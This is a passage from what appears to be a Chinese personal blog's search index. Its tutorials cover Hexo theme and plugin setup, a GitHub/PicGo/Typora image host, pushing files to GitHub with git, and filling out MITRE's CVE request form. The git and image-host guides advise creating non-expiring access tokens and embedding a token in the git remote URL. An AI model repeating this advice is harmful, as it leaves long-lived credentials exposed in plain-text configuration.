Extensions\n# theme: landscape\ntheme: mions //增加mions主题选择\n```\n\n\n\n**文章加密-hexo-blog-encrypt**\n\n安装命令：cnpm install hexo-blog-encrypt@2.0.0\n\n![](https://cdn.jsdelivr.net/gh/k0xx11/zp//hexobk25.png)\n\nthemes/mions/_config.yml配置修改\n\n```bash\n# Website's icon url.\nfavicon: /images/favicon.png //图片存放在themes\\minos\\source\\images\n# logo:\n#   text: <logo string>\nlogo: /images/logo.png //图片存放在themes\\minos\\source\\images\n\n# example of setting plain text links.\nnavbar_links:\n  GitHub:\n    icon: fab fa-github\n    url: https://github.com/用户名\n\n# Links at the bottom of the page.\nfooter_links:\n  GitHub: https://github.com/用户名\n```\n\n\n\n### (2)next主题\n\nnext主题是一个有很多人使用的主题，具体看[素念大佬的博客](http://zhuabapa.top/)\n\n源码下载：[next7.8](https://github.com/theme-next/hexo-theme-next/releases/tag/v7.8.0)\n\n源码下载好，放到themes文件夹，并重命名为next\n\n![](https://cdn.jsdelivr.net/gh/k0xx11/zp//hexobk26.png)\n\n根目录下的_config.yml配置修改\n\n```bash\n增加以下内容\n# URL\n## Set your site url here. For example, if you use GitHub Page, set url as 'https://username.github.io/project'\nurl: https://github用户名.github.io\npermalink: :year/:month/:day/:title/\n\n# Extensions\n# theme: landscape\ntheme: next //增加next主题选择\n\n# 搜索\n# 需要安装的包 cnpm install hexo-generator-search --save\nsearch:\n  path: search.json\n  field: post\n  format: html\n  limit: 1000\n\n## 加密\n# 需要安装的包 cnpm install hexo-blog-encrypt@2.0.0\nencrypt:\n  enable: true\n  # theme: \n```\n\n**文章搜索hexo-generator-search**\n\n安装命令：cnpm install hexo-generator-search --save\n\n![](https://cdn.jsdelivr.net/gh/k0xx11/zp//hexobk27.png)\n\n**文章加密-hexo-blog-encrypt**\n\n安装命令：cnpm install hexo-blog-encrypt@2.0.0\n\n![](https://cdn.jsdelivr.net/gh/k0xx11/zp//hexobk28.png)\n\n加密的使用方法\n\n```md\n---\nmessage: 17张牌你能秒我？//打开文章，显示的文字\nabstract: 姿势，什么姿势？//首页改显示的文字\npassword: password //文章的密码\ntop: 100 //这个数值越高，置顶第一\n---\n```\n\n![](https://cdn.jsdelivr.net/gh/k0xx11/zp//hexobk29.png)","categories":["hexo博客"]},{"title":"Github+Picgo+typora搭建图床","url":"/github+picgo+typora/","content":"\n先安装picgo和typora\n\npicgo : https://github.com/Molunerfinn/PicGo\n\ntypora: https://typora.io/\n\n<!-- more -->\n\n(1)在github创建一个仓库 \n\n参考: https://blog.csdn.net/weixin_43729943/article/details/103915046\n\n创建成功之后，点`Settings`-点`Develpper settings`-点`Personal access tokens`- 点`Generate new token`\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp/gpt1.png\" style=\"zoom:50%;\" />\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp/gpt2.png\" style=\"zoom:50%;\" />\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp/gpt3.PNG\" style=\"zoom:67%;\" />\n\n输入你的密码\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp/gpt4.png\" style=\"zoom: 67%;\" />\n\n填写图床token的信息\n\n```json\nNote: 名称\nExpiration：选择No expiraton无期\nSelect scopes：\n把repo勾上即可，点确认，再复制token即可\ntoken要保存好，\n```\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp/gpt5.png\" style=\"zoom:67%;\" />\n\n\n\n(2)设置typora的配置文件\n\n\n\n点文件-偏好设置\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp/gpt8.png\" style=\"zoom: 67%;\" />\n\n点图像\n\n```\n选择上传图片\n除了优先使用上传路径不勾上，其他都勾上\n上传服务设定\n选择PicGo(app)\n选择你安装picgo的路径\n```\n\n\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp/gpt9.png\" style=\"zoom: 67%;\" />\n\n上传图片的方法是复制图片过来typora即可\n\n(3)picgo设置\n\n<img src=\"https://cdn.jsdelivr.net/gh/k0xx11/zp/gpt10.png\" style=\"zoom:67%;\" />\n\n1.token填我们获取到的那个token，\n\n2.仓库名填github参加仓库的名字，例如zass/zp\n\n3.填github的分支\n\n4.设置自动义域名我这里使用了jsd加速\n\n   https://cdn.jsdelivr.net/gh/用户名/仓库名\n\n我们就可以成功上传图片了\n\n","categories":["hexo博客"]},{"title":"Git上传本地文件到github仓库","url":"/Use-git-to-upload-local-files-to-github/","content":"\n1.先安装好Git\n2.设置ssh密钥\n\n```\nssh-keygen -t rsa -C \"shell@163.com\" //生成密钥 里面填的是github注册邮箱 回车三下即可\n```\n<!-- more -->\n3.将密钥与`github`进行绑定,密钥在用户的.ssh文件夹里面参考：`C:\\Users\\host\\.ssh`\n\n点头像-Settings-SSH and GPG keys-New SSH key-key填入id_rsa.pub文件内容，title填一个名字--Add SSH key保存即可\n\n4.打开git,新建一个文件夹\n\n```\nmkdir hello //新建文件夹\ncd hello //进入这个文件夹\n```\n\n5.在`hello文件夹`输入自己的用户名和邮箱（为注册`GITHUB`账号时的用户名和邮箱）\n\n```\ngit config --global user.name \"x\" //name ---github用户名\ngit config --global user.email \"shell@163.com\" // email -- github注册的邮箱\ngit init //通过命令git init把这个文件夹hello变成Git可管理的仓库\ngit add . // 通过git add.把刚才复制过来的项目全部添加到仓库上。\ngit commit -m \"first upload\" // 通过git commit -m \"x\"把项目提交到仓库\n在github新建一个仓库\n把本地仓库与github仓库关联：\ngit remote add origin https://token_key@github.com/x/x.git  //这个token_key:\ntoken_key的获取：点头像-Settings-Developer settings-Personal access tokens--Generate new token生成新的token-输入密码-Note{填写token的名字-Expiration{选择token的有效期，Select scopes中把repo勾上-点击Generate token保存即可\ngit push -u origin master //然后上传到master分支，-u 是因为新建的远程仓库是空的 上传成功了\ngit push orign mastre // 第二次上传就不需要 -u 了\n```\n\n","categories":["Git"]},{"title":"个人怎样申请cve编号","url":"/get-cve-number/","content":"\n> 总结一下\n\n<!-- more -->\n\n申请cve编号的去步骤：\n\n1.在GitHub仓库提交issue或者在自己的CVE仓库提交md文件的报告\n\n> 前提条件： 先确认一下cms是否在github上面有仓库，如果有就看(1),如果没有就看(2)\n\n(1) 第一种是github上面有仓库\n\n例如taocms，可以去github先搜索一下,发现第一个就是\n\n![](https://cdn.jsdelivr.net/gh/k0xx11/zp/cve-1.png)\n\n点进去看一下issue,发现有很多人都在这提交了issue去申请CVE编号\n\n![](https://cdn.jsdelivr.net/gh/k0xx11/zp/cve2.png)\n\n像这种在github有仓库的，我们白盒审计/黑盒审计挖到了漏洞，都先得来他这边仓库提交一下issue，描述这个漏洞在哪里，提交issue的的所有内容都要是英文的(谷歌翻译或者腾讯翻译都行)\n\n可以参考一下这个: https://github.com/taogogo/taocms/issues/30 自行领会吧\n\n(2) 第二种就是在github没有仓库的\n\n我们可以在github建一个仓库，仓库名为CVE，然后再在仓库里创建一个`xxx.md`\n\n例如: 我挖的是taocms的xss漏洞，那么文件命名为`taocms-xss.md`，如果挖到多个xss,就命名为`taocms-xss2.md`\n\n报告也是要英文的\n\n这种报告可以参考一下这个：https://github.com/k0xx11/CVE/blob/main/taocms3.0.2-xss.md\n\n2. 在CVE官网填写表单\n\n提交 CVE 的官网地址为：https://cveform.mitre.org\n\n**[Select a request type]** 我这里选择的是：Report Vulnerability/Request CVE ID，即报告漏洞或申请 CVE ID\n\n> 这里我要说一下，一般是一个地方的漏洞提交一份issue(1)/报告(2)，每一份都单独申请一个cve\n\n**[Enter your e-mail address]** 填写自己的邮箱信息用于接收 CVE 编号：k0xx.github.io@gemil.com\n\n![](https://cdn.jsdelivr.net/gh/k0xx11/zp/cve3.png)\n\n**[Number of vulnerabilities reported or IDs requested (1-10)]** 报告的漏洞或请求的 ID 数，我填的默认是1(按实际情况来吧)\n\n勾选一下[漏洞不在 CNA 列表]和 [漏洞没有被申请过 CVE 编号]：\n\n![](https://cdn.jsdelivr.net/gh/k0xx11/zp/cve4.png))\n\n[Vulnerability type] 这里根据自己的情况选择漏洞类型，因为我这个 BUG 不好定义，所以填写了 Other or Unkown\n\n[Other vulnerability type] 因为上面漏洞类型选择的 Other，所以需要对这个漏洞进行简短的说明，我的说明内容如下：\n\n```\nCode execution caused by arbitrary editing vulnerabilities\n```\n\n![](https://cdn.jsdelivr.net/gh/k0xx11/zp/cve5.png)\n\n[Vendor of the product(s) info] 填产品供应商，例如你挖的是taocms，就填taocms\n\n[Affected product(s)/code base-受影响的产品/代码库] Product-产品 version-版本 ，例如 taocms 1.1.1\n\n[Has vendor confirmed or acknowledged the vulnerability?] 厂商是否知道此漏洞 选择**Yes**\n\n![](https://cdn.jsdelivr.net/gh/k0xx11/zp/cve6.png)\n\n[Attack type] 攻击类型 选 Remote 远程\n\n[Impact] 影响 我这边选了 Code Execution\n\n[Affected component(s)] 受影响的组件，这里可以填写问题代码、影响的功能等\n\n[Attack vector(s)] 攻击向量，主要就是漏洞利用的 Poc，我填的原文内容如下：\n\n```\nhttps://github.com/taocms/taocms/issuue/7\n```\n\n![](https://cdn.jsdelivr.net/gh/k0xx11/zp/cve8.png)\n\n[Suggested description of the vulnerability for use in the CVE] 在 CVE 中使用的建议和描述：\n\n我这边填的是： Code execution exists in taocms\n\n[Discoverer(s)/Credits] 发现者 填你的昵称，我这边填的是 k0xx\n\n![](https://cdn.jsdelivr.net/gh/k0xx11/zp/cve9.png)\n\n[Reference(s)] 参考链接，不填\n\n[Additional information] 附加信息不填\n\n最后填写验证码和点击 **Submit Request** 提交请求就可以了\n\n![](https://cdn.jsdelivr.net/gh/k0xx11/zp/cve10.png)\n\n","categories":["CVE"]}]